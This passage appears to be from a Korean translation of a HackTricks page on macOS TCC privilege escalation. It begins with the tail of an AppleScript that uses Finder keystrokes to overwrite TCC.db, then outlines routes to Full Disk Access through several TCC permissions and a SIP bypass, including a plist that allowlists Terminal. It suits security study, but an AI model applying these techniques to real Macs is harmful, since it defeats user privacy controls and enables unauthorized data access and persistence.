    -- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
    keystroke "TCC.db"
    delay 1
    keystroke return
    delay 1
    key code 51 using {command down}
    delay 1

    -- Paste the file
    keystroke "v" using {command down}
end tell
EOF
```

### `kTCCServiceAccessibility`에서 FDA\*로

이 페이지에서 FDA\*로 privesc하거나 키로거를 실행하는 데 사용할 수 있는 [**Accessibility 권한 악용 payload**](macos-tcc-payloads.md#accessibility)를 확인하세요.

### **Endpoint Security Client에서 FDA로**

**`kTCCServiceEndpointSecurityClient`**가 있으면 FDA를 보유한 것입니다. 끝.

### System Policy SysAdmin File에서 FDA로

**`kTCCServiceSystemPolicySysAdminFiles`**를 사용하면 사용자의 **`NFSHomeDirectory`** 속성을 **변경**할 수 있습니다. 이 속성을 변경하면 홈 폴더가 바뀌므로 **TCC를 우회**할 수 있습니다.<sup>[[5]](#references)</sup>

### 사용자 TCC DB에서 FDA로

**사용자 TCC** 데이터베이스에 대한 **쓰기 권한**을 얻어도 자신에게 **`FDA`** 권한을 부여할 수는 없습니다. 시스템 데이터베이스에 있는 항목만 해당 권한을 부여할 수 있습니다.

하지만 자신에게 **`Finder` 자동화 권한**을 부여하고, 앞서 설명한 기법을 악용해 FDA\*로 권한을 상승시킬 수 있습니다.

### **FDA에서 TCC 권한으로**

**Full Disk Access**의 TCC 이름은 **`kTCCServiceSystemPolicyAllFiles`**입니다.

이것이 실제 권한 상승이라고 생각하지는 않지만, 유용할 수도 있으니 참고하세요. FDA가 있는 프로그램을 제어할 수 있다면 **사용자 TCC 데이터베이스를 수정해 자신에게 원하는 모든 접근 권한을 부여**할 수 있습니다. FDA 권한을 잃을 가능성에 대비한 지속성 기법으로 유용할 수 있습니다.

### **SIP 우회에서 TCC 우회로**

시스템 **TCC 데이터베이스**는 **SIP**로 보호됩니다. 따라서 **지정된 entitlement가 있는 프로세스만 데이터베이스를 수정할 수 있습니다**. 그러므로 공격자가 **파일**에 대한 **SIP 우회**(SIP로 제한된 파일을 수정할 수 있는 방법)를 찾으면 다음 작업을 할 수 있습니다.

- TCC 데이터베이스의 **보호를 제거**하고 자신에게 모든 TCC 권한을 부여합니다. 예를 들어 다음 파일을 악용할 수 있습니다.
  - TCC 시스템 데이터베이스
  - REG.db
  - MDMOverrides.plist

하지만 이 **SIP 우회로 TCC를 우회**하는 또 다른 방법도 있습니다. `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` 파일은 TCC 예외가 필요한 애플리케이션의 허용 목록입니다. 따라서 공격자가 이 파일에서 **SIP 보호를 제거**하고 **자신의 애플리케이션**을 추가할 수 있다면, 해당 애플리케이션은 TCC를 우회할 수 있습니다.\
예를 들어 Terminal을 추가하려면:

```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```

AllowApplicationsList.plist:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Services</key>
	<dict>
		<key>SystemPolicyAllFiles</key>
		<array>
			<dict>
				<key>CodeRequirement</key>
				<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
				<key>IdentifierType</key>
				<string>bundleID</string>
				<key>Identifier</key>
				<string>com.apple.Terminal</string>
			</dict>
		</array>
	</dict>
</dict>
</plist>
```

### TCC 우회


{{#ref}}
macos-tcc-bypasses/
{{#endref}}



## References

- [1] [macOS TCC.db 심층 분석 - Rainforest QA 블로그](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [2] [maclTrack.command - com.apple.macl 추적 스크립트 (brunerd의 Gist)](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [3] [com.apple.macl 추적 및 대응](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [4] [우연과 의도에 의한 macOS TCC 사용자 개인정보 보호 기능 우회](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [5] [홈 디렉터리 변경 및 TCC 우회, 즉 CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [6] [TCC의 SQL Injection: 그리고 (아마도) 이번에는 보안 위험이 아니었던 이유](https://wts.dev/posts/tcc-sql-injection/)
- [7] [macOS에서 TCC.db 위치 및 확보](https://www.tccparser.com/en/blog/tcc-db-location-acquisition)
- [8] [macOS App Sandbox 구성](https://developer.apple.com/documentation/xcode/configuring-the-macos-app-sandbox)
- [9] [카메라 entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.device.camera)
- [10] [Apple 기기의 Privacy Preferences Policy Control 기기 관리 페이로드 설정](https://support.apple.com/guide/deployment/privacy-preferences-policy-control-payload-dep38df53c2a/web)
- [11] [유인부터 침해까지, macOS 침입 분석](https://www.microsoft.com/en-us/security/blog/2026/04/16/dissecting-sapphire-sleets-macos-intrusion-from-lure-to-compromise/)
{{#include ../../../../banners/hacktricks-training.md}}
